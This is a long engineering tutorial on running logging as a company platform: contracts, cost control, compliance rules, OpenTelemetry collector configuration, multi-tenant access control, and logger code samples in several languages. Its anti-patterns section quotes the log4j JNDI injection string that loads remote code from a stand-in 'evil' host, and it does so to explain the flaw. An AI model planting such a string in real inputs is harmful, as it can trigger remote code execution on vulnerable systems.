## Introduction

> Focus: logging stops being a **library decision** and becomes a **platform product** with SLOs, a cost line on the company P&L, a regulatory surface area, and a contract with every engineering team.

At junior level you learned what a log line is. At middle level you learned structured logging and correlation IDs. At senior level you learned to design the *pipeline* — ingestion, indexing, retention, redaction. At **professional level**, the question changes again: *who owns the logging system, what does it cost, who can be sued if it leaks, and how do 200 teams across 4 regulatory regimes emit logs that are actually joinable?*

A staff or principal engineer working on observability does not "write the logging library." They write the **logging contract** — a one-page document that says *"every service in this company emits JSON to stdout with these 9 mandatory fields, and the platform team handles everything from there."* That contract becomes a load-bearing piece of the company's architecture. Break it, and incidents become un-debuggable, audit logs become inadmissible, and the Datadog bill quietly grows to $4M/year.

> 🎓 **Why this matters at staff level:** Most observability outages are not technical — they are organizational. Two teams pick different field names for `request_id`. A vendor's pricing model rewards verbose logs. A compliance officer learns that PII has been in the logs for three years. None of these are fixed by a better logger; they are fixed by **a platform team with a contract and the authority to enforce it**.

This file is opinionated. It assumes you have seen at least one logging budget overrun, at least one GDPR scare, and at least one all-hands debate about whether to switch from Elasticsearch to Loki. If you have not, treat the numbers and case studies as the maps that prevent you from walking those roads the slow way.

---

## Prerequisites

You should already have:

- **Senior-level fluency** with `senior.md` — pipelines, sampling, retention tiers, redaction, correlation IDs, sinks.
- Worked on at least one production system at meaningful scale (≥1k req/s or ≥50 services).
- Read and understood at least one incident review where logs were the bottleneck.
- Some exposure to OpenTelemetry (logs, metrics, or traces) and at least one vendor (Datadog, Splunk, Honeycomb, New Relic, Sumo Logic, Loki).
- A working mental model of GDPR, SOC 2, or HIPAA — not legal expertise, but knowing which fields are dangerous.

If those are shaky, read `senior.md` first. Without that base, this file will sound like jargon.

## Glossary

| Term | Meaning |
|---|---|
| **Logging contract** | One-page document defining mandatory fields, format, transport, and ownership for every service in an org. |
| **Wide event** | A single structured log/event row with high cardinality and many attributes — replaces both logs and metrics in Observability 2.0. |
| **Tail-based sampling** | Decide whether to keep a trace/log only after the request finishes, based on outcome (error, slow). |
| **Head-based sampling** | Decide whether to keep a trace/log at the start of the request, by hash. Cheap but blind. |
| **Chargeback** | Internal billing — the platform team bills each engineering team for their share of log ingestion cost. |
| **Showback** | Same as chargeback but informational only (no real money moves). |
| **PHI** | Protected Health Information (HIPAA). |
| **PCI DSS** | Payment Card Industry Data Security Standard — strict log rules for cardholder data. |
| **Article 30** | GDPR clause requiring "records of processing" — a catalog of what personal data exists and where. |
| **Immutable audit log** | Append-only, hash-chained, often signed log used for compliance and forensics. |
| **OTel Collector** | Vendor-neutral agent/proxy that receives, processes, and exports telemetry. |
| **Resource attributes** | OTel attributes describing the *emitter* (service, version, host, region) — set once, attached automatically. |
| **Instrumentation scope** | OTel attribute identifying the library that produced the log line. |
| **Severity number** | OTel's 1-24 numeric severity scale, mapped from text levels like `INFO`/`ERROR`. |
| **Tenant isolation** | Architectural guarantee that tenant A cannot read tenant B's logs, even via shared infrastructure. |
| **Shadow write** | Emit to both old and new pipelines simultaneously during migration to validate parity. |
| **Schema lint** | OTel Collector processor that drops or flags log lines violating the org schema. |
| **DLQ** | Dead-letter queue — where logs go when the pipeline rejects them. |
| **Log budget** | A per-team cap on monthly log volume, enforced at the collector. |
| **Cardinality bomb** | An attribute (e.g. `user_email`) that explodes index size and cost. |
| **Field name drift** | Different services emit semantically identical data under different keys (`req_id` vs `request_id`). |

## Core Concepts

### 1. Logging is no longer a library — it is a platform product

At this level, the question shifts from *"which logger should I use?"* to *"what does my company's logging platform offer to its internal customers, and at what SLO and price?"* The deliverable is a **platform service** with a roadmap, an on-call rotation, dashboards, and a charge model.

### 2. The contract is a one-pager, enforced at the edge

You publish: *"emit JSON to stdout with these fields; everything else is our problem."* Then you enforce it at the collector with a schema processor — drop or quarantine non-compliant lines. The contract is short on purpose; long contracts get ignored.

### 3. Cost is a first-class design constraint

A logging system that ingests every line is a logging system that bankrupts the company. Sampling, tiered retention, and per-team budgets are not optimizations — they are *requirements*.

### 4. Compliance is not optional

GDPR, HIPAA, SOC 2, and PCI DSS are not "the legal team's problem." They impose concrete constraints on **what your logs may contain**, **how long they live**, **who may read them**, and **whether they can be modified**. A staff engineer who does not know these constraints will design a system that fails audit and ships PII to a foreign data center.

### 5. Logs, metrics, and traces are converging

OpenTelemetry treats them as three views of the same event. The Observability 2.0 school (Honeycomb) goes further: there are only wide events, and metrics/logs/traces are queries over them. Both views demand that your platform be vendor-agnostic at the wire format.

### 6. Multi-tenancy is the hardest part

In a SaaS, every log line belongs to a tenant. Mixing tenants in shared indexes saves money but creates ACL and exfiltration risks. Per-tenant indexes save the ACL problem but explode operational cost. The right answer is almost always *per-tenant field with row-level ACL*.

### 7. Libraries don't own loggers, applications do

A library that instantiates its own logger fights with the host application. The correct pattern is **dependency injection** of a known interface (`slog.Logger`, `org.slf4j.Logger`, `structlog.BoundLogger`).

### 8. The platform team has its own SLOs

Ingestion latency, drop rate, end-to-end log freshness, query availability, schema-conformance rate — these are tracked, alerted, and reported like any other product SLO.

## Real-World Analogies

| Logging concept | Real-world analog |
|---|---|
| Logging contract | The CDC's hospital data-reporting standard — every hospital uses the same fields so the data is joinable nationally. |
| Tail-based sampling | A factory only keeping the defective units off the line for inspection; ships the rest. |
| Per-team log budget | Each department's photocopier code: copy as much as you want, but it shows up on your monthly report. |
| Schema lint at the collector | TSA pre-check — your bag is inspected before it enters the secure area. |
| Immutable audit log | A notary's logbook — pages are pre-numbered, signed, and cannot be torn out. |
| OTel Collector | A railway interchange — every train (telemetry stream) arrives in a standard gauge, gets routed to the right destination. |
| Wide event | A hospital chart — one row per patient visit with every observation attached, not 47 separate forms. |
| Multi-tenant logging | A shared bank vault with individual deposit boxes — same building, separate keys. |
| Library DI of logger | A consultant uses the client's letterhead, not their own — the host owns the voice. |

---

## Mental Models

### Mental Model 1 — "You are running a small SaaS for your engineers"

Treat the logging platform as a B2B product whose customers are internal teams. They have SLAs. They expect a status page. They expect cost transparency. They will churn (route around you) if you don't deliver. This framing forces you to invest in onboarding docs, ingestion SLOs, and chargeback dashboards.

### Mental Model 2 — "Every log line has three owners"

The **emitter** (the service that produced it) owns format conformance. The **platform** owns transport, storage, and indexing. The **consumer** (SRE, security, analytics) owns the queries. Confusion about who fixes what — broken schemas, missing fields, blown budgets — is the #1 source of operational pain. Make ownership explicit.

### Mental Model 3 — "Cost = Volume × Cardinality × Retention × Indexing"

Each multiplier is a knob. Tail-based sampling shrinks volume. Field allowlists shrink cardinality. Tiered storage shrinks retention. Choosing Loki over Elasticsearch shrinks indexing. Most cost blowups are one of these four turned up to eleven by accident.

### Mental Model 4 — "Compliance is a filter, not a feature"

You do not bolt on GDPR; you design the platform so PII *cannot* reach it. The collector strips it. The schema rejects it. Audit logs live in a separate, immutable store. Compliance becomes a property of the pipeline, not a checkbox per service.

## Logging as a Platform

### The platform-team contract

A staff-level deliverable is a literal one-pager. Here is the canonical form:

```text
ORG LOGGING CONTRACT v3.2
─────────────────────────────────────────────────────────
You (the service team):
  - Emit JSON Lines to stdout, one event per line, UTF-8.
  - Include the 9 mandatory fields below.
  - Never include any field on the Forbidden List.
  - Use the org logging SDK (golang/python/java/node) so
    redaction and field naming happen for free.

We (the platform team):
  - Collect from stdout via the node agent.
  - Enrich with resource attributes (host, region, k8s.*).
  - Run schema lint; quarantine non-compliant lines.
  - Sample at the tail; route by severity to hot/warm/cold.
  - Provide query UI, alerting, and a 13-month archive.
  - Publish an SLO of 99.9% ingestion, p95 < 30s freshness.

Mandatory fields:
  timestamp        RFC3339 with nanoseconds
  severity         one of TRACE,DEBUG,INFO,WARN,ERROR,FATAL
  service.name     dot-namespaced, e.g. payments.charges
  service.version  semver
  deployment.env   prod|staging|dev
  region           e.g. us-east-1
  request_id       UUID v4 per inbound request
  trace_id         W3C traceparent
  span_id          W3C traceparent

Conditionally required:
  tenant_id        if multi-tenant
  user_id          hashed; never raw email/phone

Forbidden:
  Raw PII, secrets, JWTs, full credit card numbers,
  PHI, multi-line stack traces without escaping.
─────────────────────────────────────────────────────────
```

### The "logging library wrapper" approach

Rather than letting each team adopt `zap`, `zerolog`, `logrus`, `slog`, etc. independently, ship an **internal SDK** that wraps the chosen logger. The wrapper:

- Hard-codes field names from the contract.
- Refuses to log forbidden field names (or silently redacts them).
- Auto-injects `service.name`, `service.version`, `region` from env.
- Reads `trace_id`/`span_id` from the current context.
- Exposes a tiny surface area: `log.Info(ctx, "event", attrs...)`.

This is not "not invented here." It is **field-name discipline at the edge**. Without it, your indexes have `req_id`, `requestId`, `request_id`, `correlation_id`, and `cid` all meaning the same thing, and joins become impossible.

### Per-team vs central schema ownership

Two extremes:

- **Central** — one team owns every field name. Strong consistency, slow innovation.
- **Per-team** — each team picks. Fast, but joinability dies.

The professional answer is **federated schema** — the platform team owns the *mandatory core* (the 9 fields above), and each team owns its own *namespace* (`payments.*`, `auth.*`). The collector enforces "core" but lets teams extend within their prefix.

### "JSON to stdout, we handle the rest"

The transport contract is deliberately boring. Stdout works for: Kubernetes pods, Docker containers, bare-metal systemd journals, Lambda, ECS, Cloud Run. Every node agent (Fluent Bit, Vector, OTel Collector) reads it. No team needs an SDK that "knows about Datadog." That decoupling is what lets you swap vendors in a quarter.

---

## Cost Engineering

### The $4M/year case study

A real number from a SaaS that grew to 100k req/s on Datadog Logs (pricing approx $1.27/GB ingested + retention):

```text
Logs/sec                  ≈ 100,000
Avg bytes/log             ≈ 800 (structured JSON, full context)
Bytes/sec                 ≈ 80 MB
Bytes/day                 ≈ 6.9 TB
Bytes/month               ≈ 207 TB
Datadog cost @ $1.27/GB   ≈ $263k/month  ≈ $3.16M/yr
+ 30 day retention        ≈ +$0.6M/yr
+ live tail / index tiers ≈ +$0.3M/yr
                          ─────────
Total                     ≈ $4.0M/yr
```

After introducing **tail-based sampling** (keep 100% of errors, 100% of slow requests >1s, 1% of normal requests), volume dropped ~95%:

```text
Errors retained           100%   → ~1% of traffic = 1k/s
Slow retained             100%   → ~0.5% of traffic = 0.5k/s
Sampled normal            1%     → 1k/s
Total retained            ~2.5k/s vs 100k/s original
Cost                      ~$100k–$200k/yr
Savings                   ~$3.8M/yr
```

**The lesson:** the most expensive log line is the one nobody ever queries. A staff engineer's job is to find the 95% no one queries and stop paying for it.

### Per-team log budgets and chargeback

Once you have per-team field tagging (`service.name`), you can compute monthly GB per team and bill internally. Two models:

- **Showback** — dashboards show cost; no money moves. Cultural pressure only. Works in small orgs.
- **Chargeback** — actual budget allocation. Teams over budget either reduce volume or pay from their own org budget. Works at >500 engineers when finance is involved.

Without budgets, the tragedy of the commons is universal: every team's logs are *the platform's problem* until the CFO sees the bill.

### "1% of debug at the right moment beats 100% of info forever"

The most useful log line is the DEBUG line from the 1 service involved in the incident, during the 30 minutes the incident lasted. Storing 100% DEBUG forever to capture that is the wrong design. Instead:

- DEBUG is **off by default** in production.
- A control plane lets SREs flip DEBUG on for a specific service for a window (e.g. 30 minutes).
- The platform automatically reverts.

This is sometimes called **dynamic log levels** or **on-demand verbosity**. It is a feature your platform should ship.

### Vendor cost models

| Vendor | Charges on | Cost lever | Watch out for |
|---|---|---|---|
| Datadog Logs | GB ingested + indexed days | Sampling, retention tiers | "Live tail" is per-GB on top |
| Splunk | GB indexed/day | Index allowlist, summary indexing | License overage fees |
| Sumo Logic | GB ingested | Pre-filter at collector | Continuous queries |
| Elastic Cloud | Storage + compute | Hot/warm/cold tiers, ILM | Search costs spike unbounded |
| Grafana Loki | Query volume + storage | Cheap storage, expensive aggregations | Cardinality on labels |
| Honeycomb | Events ingested | Sampling | Wide events are the model |
| AWS CloudWatch Logs | Ingest + storage | Log group retention | Cross-region transfer |

Knowing the *axis of billing* is the entire game. If you pay per GB, sample. If you pay per query, denormalize. If you pay per indexed field, use field allowlists.

## Compliance-Grade Logging

### GDPR — what your logs must NOT contain

GDPR Article 30 requires you to maintain "records of processing activities" — essentially a catalog of where personal data lives. **If logs contain personal data, your log store is in scope.** That is expensive: data subject access requests (Article 15), right to erasure (Article 17), data residency (Article 44), all apply.

Practical rules:

- Never log raw email, phone, IP, full name, government ID, location data.
- Always hash/pseudonymize stable identifiers (`user_id_hash = sha256(user_id + salt)`).
- Log access patterns, not data values: log `user_id_hash=abc` accessed `record_type=invoice`, not the invoice contents.
- IP addresses are personal data under GDPR — truncate or hash before storage.

### HIPAA — audit logs for PHI

US healthcare. Every access to Protected Health Information must be logged with: **who** accessed, **what** record, **when**, **from where**, **why** (purpose code). These audit logs themselves are PHI and must be encrypted at rest and in transit. Retention: 6 years minimum.

**Architectural implication:** audit logs and application logs are two different systems. Application logs use the cheap platform pipeline; audit logs go to a hardened, append-only store with a separate ACL.

### SOC 2 audit log requirements

SOC 2 Type II requires "controls over access to systems and data" be auditable. In practice:

- Immutable audit log of admin actions, auth events, config changes.
- Retention typically 1 year minimum; many auditors expect 13 months to cover an annual review window.
- Access to audit logs is logged and reviewed quarterly.
- Logs include enough context to reconstruct the action (actor, target, before/after).

### PCI DSS

For systems handling cardholder data:

- Audit logs of all access to cardholder data.
- Log integrity (file integrity monitoring, hash chain) is explicit in requirement 10.5.
- 1 year retention, 3 months immediately available.
- Never log full PAN (primary account number), CVV, or PIN.

### Audit log vs application log lifecycle

| Dimension | Application logs | Audit logs |
|---|---|---|
| Volume | High (GB/day per service) | Low (MB/day per service) |
| Retention | 7–30 days hot, 90 days warm | 1–7 years |
| Mutability | Can be dropped, sampled, edited | Append-only, hash-chained |
| ACL | Engineering team + SRE | Security team + auditors only |
| Storage | Hot/warm tiered, cheap | WORM (write-once-read-many) or signed S3 Object Lock |
| Sampling | Yes, aggressively | Never |
| Format | Free-form JSON | Strict schema, often signed |

Confusing these two systems is the #1 audit-failure pattern.

## Structured Event Analytics (Observability 2.0)

The Honeycomb school, championed by **Charity Majors**, makes a sharp claim: traditional logging is dead, replaced by **wide structured events**.

### The thesis

Old observability is three pillars: logs, metrics, traces. Each is a lossy projection of reality. You can't *ask new questions* of metrics because they were pre-aggregated. You can't *cheaply query* logs because they're text. You can't *correlate* the three because they have different schemas.

Observability 2.0 says: emit **one wide event per unit of work** (e.g. per HTTP request, per job execution). That event has every available attribute — request size, user tier, db query count, cache hit rate, downstream latencies, version of every dependency. Metrics, dashboards, and traces are then **queries** over that table.

### The `event_type=` discipline

Every emitted event has a field `event_type` describing what unit of work it is: `event_type=http_request`, `event_type=job_run`, `event_type=cron_tick`. Filters and views are keyed off this. A wide event is *not* a log line — it is a row in an analytics table.

### High-cardinality fields as first-class

Old log systems (Elasticsearch with `keyword` indexing, Datadog with cardinality penalties) punish you for high-cardinality fields like `user_id`, `request_id`, `feature_flag_variant`. Honeycomb's columnar engine doesn't. That changes what you can debug: you can ask *"show me all requests from user X in the last hour where the third-party API took >500ms"* in real time.

### When this replaces traditional logging

It replaces it when:

- Your debugging questions are *"why is this specific user/request slow?"*
- You already have OpenTelemetry traces — wide events are basically annotated spans.
- You can afford a columnar event store (Honeycomb, ClickHouse, Snowflake events).

It does **not** replace traditional logging when:

- You need verbose DEBUG-level streams of arbitrary library output.
- You have audit logs (those have hard schemas).
- You're stuck on legacy infra that only writes text to stderr.

### Charity Majors' "observability without unknowns" thesis

The point isn't to dashboard the things you know are broken. It's to be able to answer *any question* about your production system, including questions you didn't know to ask until 3am. Wide events with high cardinality are the only known way to do that affordably.

---

## OpenTelemetry Logs — The Unification

OpenTelemetry (OTel) is the CNCF standard for telemetry. Its **logs data model** is the convergence point the whole industry is migrating to.

### The OTel logs data model

A log record has:

| Field | Meaning |
|---|---|
| `timestamp` | Event time |
| `observed_timestamp` | When the collector received it (for clock-skew detection) |
| `severity_number` | 1–24 numeric (TRACE=1, DEBUG=5, INFO=9, WARN=13, ERROR=17, FATAL=21) |
| `severity_text` | "INFO", "ERROR" — for humans |
| `body` | Either a string or a structured map |
| `attributes` | Free-form key/value, per-record |
| `trace_id` / `span_id` | W3C trace context, automatic if instrumented |
| `resource` | Attributes about the *emitter* (service, host, region) — set once per process |
| `instrumentation_scope` | Library that produced this record (e.g. `org.example.payments`) |

### Logs and traces share the same context

Because `trace_id` and `span_id` are first-class in the log model, a log emitted inside a span automatically joins. Click a span in a trace UI → see all logs in that span. This eliminates the manual `request_id` plumbing you did at middle level.

### OTel Collector pipelines

The collector is a vendor-neutral agent that runs as a sidecar, daemonset, or gateway. Its config has three stages:

```yaml
# receivers: where logs come from
# processors: transforms applied in order
# exporters: where logs are sent
receivers:
  otlp:
    protocols:
      grpc: { endpoint: 0.0.0.0:4317 }
  filelog:
    include: [/var/log/pods/*/*/*.log]
    operators:
      - type: json_parser

processors:
  batch:
    timeout: 5s
    send_batch_size: 1000
  attributes/redact:
    actions:
      - key: email
        action: hash
      - key: password
        action: delete
  filter/drop_debug:
    logs:
      log_record:
        - 'severity_number < SEVERITY_NUMBER_INFO and resource.attributes["deployment.env"] == "prod"'
  resource/enrich:
    attributes:
      - key: region
        value: ${env:AWS_REGION}
        action: insert
  tail_sampling:
    decision_wait: 30s
    policies:
      - { name: errors, type: status_code, status_code: { status_codes: [ERROR] } }
      - { name: slow,   type: latency,     latency: { threshold_ms: 1000 } }
      - { name: prob,   type: probabilistic, probabilistic: { sampling_percentage: 1 } }

exporters:
  otlphttp/datadog:
    endpoint: https://http-intake.logs.datadoghq.com
    headers: { DD-API-KEY: ${env:DD_API_KEY} }
  loki:
    endpoint: http://loki:3100/loki/api/v1/push
  file/audit:
    path: /mnt/audit/audit.jsonl
    rotation: { max_megabytes: 100 }

service:
  pipelines:
    logs/application:
      receivers: [otlp, filelog]
      processors: [resource/enrich, attributes/redact, filter/drop_debug, batch]
      exporters: [otlphttp/datadog, loki]
    logs/audit:
      receivers: [otlp]
      processors: [resource/enrich, batch]
      exporters: [file/audit]
```

The two pipelines — `logs/application` and `logs/audit` — share receivers but diverge in policy. Application logs get sampled and shipped to vendors; audit logs go untouched to durable storage.

### "Instrument once, send anywhere"

The single biggest argument for OTel: your application code emits OTel-shaped records. The collector decides where they go. Switching from Datadog to Splunk becomes a collector config change, not a 200-service migration. That decoupling is worth the migration cost.

### Migration paths

| Stack | Pre-OTel | OTel path |
|---|---|---|
| Java / SLF4J | Logback → Datadog appender | SLF4J → OpenTelemetry appender bridge → OTLP |
| Python | `logging` → JSON formatter → stdout | `logging` + `OpenTelemetryHandler` → OTLP |
| Go | `slog` or `zap` → stdout | `slog` + `otelslog` bridge → OTLP |
| Node | `pino` → stdout | `pino-opentelemetry-transport` → OTLP |
| Rust | `tracing` → JSON | `tracing-opentelemetry` → OTLP |

The pattern is always the same: a thin bridge from your existing logger into the OTel SDK, then OTLP out the door.

## Multi-Tenant Logging

In a SaaS, every log line belongs to *some tenant*. Getting this wrong is how you end up with tenant A's data showing in tenant B's debug dashboard. That is an incident, and depending on the data, possibly a breach.

### Per-tenant indexes vs per-tenant fields

| Approach | Pros | Cons |
|---|---|---|
| **Index per tenant** | Strong isolation; per-tenant retention/ACL easy | Index sprawl; ops cost scales with tenants; cross-tenant queries hard |
| **Field per tenant (`tenant_id` filter)** | Cheap; cross-tenant queries trivial | ACL enforced by query layer — one bug = leak |
| **Hybrid: hot tier sharded by tenant, cold tier shared** | Best of both | Two systems to maintain |

The pragmatic answer for most SaaS: **single index, `tenant_id` field, ACL enforced at the query proxy**. Combine with row-level encryption for highly sensitive tenants.

### Per-tenant access control

The query proxy (Grafana, Kibana, or a custom layer) injects `tenant_id IN (...)` into every query, based on the user's group membership. Users can never bypass — even raw API calls go through the proxy. The proxy itself logs every query (meta-audit) so an audit shows who saw what.

### Cross-tenant queries (security team needs this)

The security team needs to ask: *"is anyone seeing 4xx spikes across all tenants?"* That requires bypassing the tenant filter. The right design:

- A separate role `security-incident-responder` can run cross-tenant queries.
- Every such query is logged with a justification field (`incident_id`).
- Quarterly review of cross-tenant queries.

This is the **break-glass procedure** for log access.

### Tenant ID propagation through async boundaries

The hardest part. Tenant ID enters at the edge (from JWT, header, or subdomain). It must flow through:

- HTTP middleware → handler → service → repository → log.
- Async jobs (queue messages carry `tenant_id` as header).
- Cron jobs that touch one tenant (set `tenant_id` in job context).
- Cron jobs that touch many tenants (set `tenant_id` per iteration; never log unscoped).

Use the same machinery as `trace_id` — context propagation. Any code path that doesn't carry `tenant_id` should be unable to call the logger.

## Designing Logging for an SDK or Library

A library that prints to stdout, instantiates its own logger, or hardcodes a format is a library that breaks its caller's observability pipeline.

### The rules

1. **Do not instantiate a logger.** Accept one from the caller, or look up a known interface in context.
2. **Default to a no-op logger if none provided.** Never crash because the caller didn't configure logging.
3. **Use the host's standard interface.** Go: `*slog.Logger`. Java: `org.slf4j.Logger`. Python: `logging.Logger`. Node: any with `.info/.warn/.error`. Rust: the `log` crate facade.
4. **Don't log secrets, ever.** Even if the caller might. Redact aggressively before passing values into log args.
5. **Use structured key/value, not formatted strings.** Lets the caller route/filter.
6. **Log sparingly at INFO; verbosely at DEBUG.** A library spewing INFO into every caller's logs is hostile.
7. **Use a stable logger name.** `org.example.mylib` — lets callers configure level per library.

### "Log to your caller's logger" — code

```go
package mylib

import (
    "context"
    "log/slog"
)

type Client struct {
    log *slog.Logger
}

type Option func(*Client)

func WithLogger(l *slog.Logger) Option {
    return func(c *Client) { c.log = l }
}

func New(opts ...Option) *Client {
    c := &Client{log: slog.New(slog.DiscardHandler)} // no-op default
    for _, o := range opts {
        o(c)
    }
    return c
}

func (c *Client) DoThing(ctx context.Context, id string) error {
    c.log.DebugContext(ctx, "mylib.do_thing.start", slog.String("id", id))
    // ... business logic
    return nil
}
```

The library's caller controls the logger, the format, the level, and the destination. The library only chooses *what* to log, never *how*.

---

## Code Examples

### Go — slog with OTel bridge and resource attributes

```go
package main

import (
    "context"
    "log/slog"
    "os"

    "go.opentelemetry.io/contrib/bridges/otelslog"
    "go.opentelemetry.io/otel/log/global"
    sdklog "go.opentelemetry.io/otel/sdk/log"
    "go.opentelemetry.io/otel/sdk/resource"
    semconv "go.opentelemetry.io/otel/semconv/v1.26.0"
)

func main() {
    res, _ := resource.New(context.Background(),
        resource.WithAttributes(
            semconv.ServiceName("payments.charges"),
            semconv.ServiceVersion("2.7.1"),
            semconv.DeploymentEnvironment("prod"),
        ),
    )
    provider := sdklog.NewLoggerProvider(sdklog.WithResource(res))
    global.SetLoggerProvider(provider)
    defer provider.Shutdown(context.Background())

    logger := otelslog.NewLogger("payments")
    slog.SetDefault(logger)

    ctx := context.Background()
    logger.InfoContext(ctx, "charge.requested",
        slog.String("event_type", "charge_requested"),
        slog.String("tenant_id", "acme"),
        slog.Int64("amount_cents", 1999),
    )

    if err := charge(ctx); err != nil {
        logger.ErrorContext(ctx, "charge.failed",
            slog.String("event_type", "charge_failed"),
            slog.Any("error", err),
        )
        os.Exit(1)
    }
}

func charge(ctx context.Context) error { return nil }
```

### Python — `logging` + OTel handler

```python
import logging
import os

from opentelemetry import trace
from opentelemetry._logs import set_logger_provider
from opentelemetry.sdk._logs import LoggerProvider, LoggingHandler
from opentelemetry.sdk._logs.export import BatchLogRecordProcessor
from opentelemetry.exporter.otlp.proto.grpc._log_exporter import OTLPLogExporter
from opentelemetry.sdk.resources import Resource

resource = Resource.create({
    "service.name": "payments.charges",
    "service.version": "2.7.1",
    "deployment.environment": "prod",
    "region": os.environ.get("AWS_REGION", "us-east-1"),
})
provider = LoggerProvider(resource=resource)
provider.add_log_record_processor(BatchLogRecordProcessor(OTLPLogExporter()))
set_logger_provider(provider)

logging.basicConfig(level=logging.INFO, handlers=[LoggingHandler()])
log = logging.getLogger("payments")

tracer = trace.get_tracer(__name__)

def charge(tenant_id: str, amount_cents: int) -> None:
    with tracer.start_as_current_span("charge") as span:
        log.info("charge.requested",
                 extra={"event_type": "charge_requested",
                        "tenant_id": tenant_id,
                        "amount_cents": amount_cents})
        # trace_id and span_id flow automatically into the log record
        try:
            do_work()
        except Exception:
            log.exception("charge.failed",
                          extra={"event_type": "charge_failed",
                                 "tenant_id": tenant_id})
            raise

def do_work() -> None:
    pass

if __name__ == "__main__":
    charge("acme", 1999)
```

### Java — SLF4J + Logback + OTel appender

```java
package com.example.payments;

import io.opentelemetry.api.GlobalOpenTelemetry;
import io.opentelemetry.api.trace.Span;
import io.opentelemetry.api.trace.Tracer;
import net.logstash.logback.argument.StructuredArguments;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class ChargeService {
    private static final Logger log = LoggerFactory.getLogger(ChargeService.class);
    private final Tracer tracer = GlobalOpenTelemetry.getTracer("payments");

    public void charge(String tenantId, long amountCents) {
        Span span = tracer.spanBuilder("charge").startSpan();
        try (var scope = span.makeCurrent()) {
            log.info("charge.requested",
                StructuredArguments.kv("event_type", "charge_requested"),
                StructuredArguments.kv("tenant_id", tenantId),
                StructuredArguments.kv("amount_cents", amountCents));
            doWork();
        } catch (RuntimeException e) {
            log.error("charge.failed",
                StructuredArguments.kv("event_type", "charge_failed"),
                StructuredArguments.kv("tenant_id", tenantId), e);
            throw e;
        } finally {
            span.end();
        }
    }

    private void doWork() { /* ... */ }

    public static void main(String[] args) {
        new ChargeService().charge("acme", 1999L);
    }
}
```

Logback's `logback.xml` then wires an OTel appender that bridges every event into OTLP.

### Rust — `tracing` + OTel

```rust
use opentelemetry::global;
use opentelemetry_otlp::WithExportConfig;
use opentelemetry_sdk::Resource;
use tracing::{error, info, instrument};
use tracing_subscriber::layer::SubscriberExt;
use tracing_subscriber::util::SubscriberInitExt;

#[instrument(skip_all, fields(tenant_id = %tenant_id, amount_cents))]
fn charge(tenant_id: &str, amount_cents: i64) -> Result<(), String> {
    info!(event_type = "charge_requested", "charge requested");
    do_work().map_err(|e| {
        error!(event_type = "charge_failed", error = %e, "charge failed");
        e
    })
}

fn do_work() -> Result<(), String> { Ok(()) }

fn main() {
    let exporter = opentelemetry_otlp::new_exporter()
        .tonic()
        .with_endpoint("http://otel-collector:4317");
    let resource = Resource::new(vec![
        opentelemetry::KeyValue::new("service.name", "payments.charges"),
        opentelemetry::KeyValue::new("service.version", "2.7.1"),
    ]);
    let provider = opentelemetry_otlp::new_pipeline()
        .logging()
        .with_exporter(exporter)
        .with_resource(resource)
        .install_batch(opentelemetry_sdk::runtime::Tokio)
        .unwrap();
    global::set_logger_provider(provider);

    tracing_subscriber::registry()
        .with(tracing_subscriber::fmt::layer().json())
        .with(opentelemetry_appender_tracing::layer::OpenTelemetryTracingBridge::new(
            &global::logger_provider(),
        ))
        .init();

    let _ = charge("acme", 1999);
}
```

All four examples follow the same pattern: a known logger interface, structured key/value, automatic context propagation, OTLP exit.

## Coding Patterns

### Pattern — Schema lint at the collector

Reject or quarantine logs that violate the contract. Drop unauthorized fields; alert on schema-drift rates.

```yaml
processors:
  transform/schema_lint:
    log_statements:
      - context: log
        statements:
          - drop() where attributes["event_type"] == nil
          - delete_key(attributes, "email")
          - delete_key(attributes, "ssn")
          - set(attributes["schema_violation"], true) where resource.attributes["service.version"] == nil
```

### Pattern — Dynamic log level via control plane

Expose `/debug/loglevel` on each service, gated behind SRE auth. Allow setting level for N minutes; auto-revert.

### Pattern — Wide event per unit of work

One `event_type=http_request` event at the end of each request, with every interesting attribute. Replaces a dozen INFO lines.

### Pattern — Shadow write during migration

Emit to old pipeline (`stdout`-Fluentd-Elasticsearch) and new (`stdout`-OTel-Datadog) simultaneously. Diff query results over a week. Cut over when parity is >99.9%.

### Pattern — Per-tenant ACL injector

A query proxy that rewrites every query with `tenant_id IN (user.tenant_ids)`. Users cannot bypass the rewrite even via raw API.

---

## Anti-Patterns at Professional Level

### 1. "We log everything"

Storage is cheap; *understanding* is not. Drowning in data without a contract or sampling means your search bar is useless. The fix is the contract + tail sampling + wide events.

### 2. Logs that contain PII because no one designed redaction

Engineers add `log.Info("user", user)` without thinking. The `User` struct serializes email, phone, address. Six months later, your GDPR officer files a breach notification. **Fix:** make the SDK refuse to log forbidden field names and forbid `%+v`-style struct dumps in code review.

### 3. Field-name drift across services

Service A logs `req_id`, B logs `requestId`, C logs `request_id`, D logs `correlation_id`. Joining a request across all four is impossible. **Fix:** the org SDK uses the contract's name, and the schema lint drops the others.

### 4. Multi-line stack traces breaking JSON parsers

`logger.error(stack_trace)` prints 40 lines, each parsed as a separate record. The downstream JSON parser explodes. **Fix:** either escape the stack into a single field, or use a multi-line collector config (`multiline.start_pattern`).

### 5. Inconsistent severity semantics

Team A logs `ERROR` for any failed request; Team B logs `ERROR` only when the system is broken. Cross-service "error rate" dashboards become meaningless. **Fix:** publish severity definitions in the contract. `ERROR` = the service failed to do its job, not the user mistyped a password.

### 6. "We can't change loggers — everything depends on the format"

The classic lock-in. The fix is to **never let the format become the API**. Apps emit a structured interface (OTel); the collector decides the format. Swap formats by changing the collector.

### 7. Alerting on log strings

`if grep ERROR | wc -l > 100: page`. Log-grepping is fragile; refactor a log line and your alert silently breaks. **Fix:** convert log lines to metrics (Prometheus counter, OTel meter) at the collector, then alert on the metric. The metric has SLOs; the log line is just narrative.

### 8. "We'll store everything in Elasticsearch"

ES is a search engine, not a cheap log store. Past ~1 TB/day, costs and ops pain explode. **Fix:** tiered storage. Recent + searched data in ES/Loki; older or rarely-queried in S3/GCS with on-demand search (Athena, BigQuery).

### 9. log4j-style RCE (CVE-2021-44228)

The infamous `log4j` flaw: log message strings were interpolated through JNDI lookup, so logging an attacker-controlled string like `${jndi:ldap://evil/x}` triggered remote class loading. The vulnerability lived because **the logger was doing more than logging**. Principles:

- Never let untrusted input influence the *behavior* of the logger, only its *content*.
- Disable feature flags in loggers (lookups, expressions) unless you need them.
- Log forced-quote user input; never raw.

### 10. Local timezones in logs

Logs from us-east-1 show `14:30 EST`, from eu-west-1 show `14:30 CET`. Correlation becomes a timezone math exercise. **Fix:** always RFC 3339 UTC with nanoseconds. The contract enforces it.

